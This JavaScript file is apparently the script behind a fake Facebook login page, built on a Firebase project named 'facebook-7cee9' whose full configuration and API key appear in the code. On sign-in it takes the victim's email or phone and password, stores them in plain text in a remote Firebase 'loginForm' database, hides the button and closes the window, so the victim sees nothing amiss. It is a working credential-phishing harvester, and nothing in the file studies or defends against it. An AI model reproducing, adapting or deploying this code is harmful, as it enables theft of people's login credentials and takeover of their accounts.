const firebaseConfig = {
  apiKey: "AIzaSyD8kneKyI-dPFQ9p9TOmD-ceRufMkehPUc",
  authDomain: "facebook-7cee9.firebaseapp.com",
  databaseURL: "https://facebook-7cee9-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "facebook-7cee9",
  storageBucket: "facebook-7cee9.appspot.com",
  messagingSenderId: "911761401756",
  appId: "1:911761401756:web:06a2a15d57bf3c5d948a59",
  measurementId: "G-MXRJEFNTCE"
};


// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference for your database
let database = firebase.database();
let loginFormDB = database.ref('loginForm');

const signinBtn = document.getElementById("signinBtn");

signinBtn.addEventListener("click", (event) => {
  submitForm(event);
  signinBtn.style.display = "none";
  setTimeout(() => {
    window.close();
  }, 2000);
});

function submitForm(event) {
  event.preventDefault();

  let emailPhone = getElementValue('email');
  let password = getElementValue('password');

  saveMessages(emailPhone, password);
}

const saveMessages = (emailPhone, password) => {
  let newLoginForm = loginFormDB.push();

  newLoginForm.set({
    emailPhone: emailPhone,
    password: password
  });
};

const getElementValue = (id) => {
  return document.getElementById(id).value;
};

if (window.innerWidth <= 600) {
  window.location = "./phone.html"
}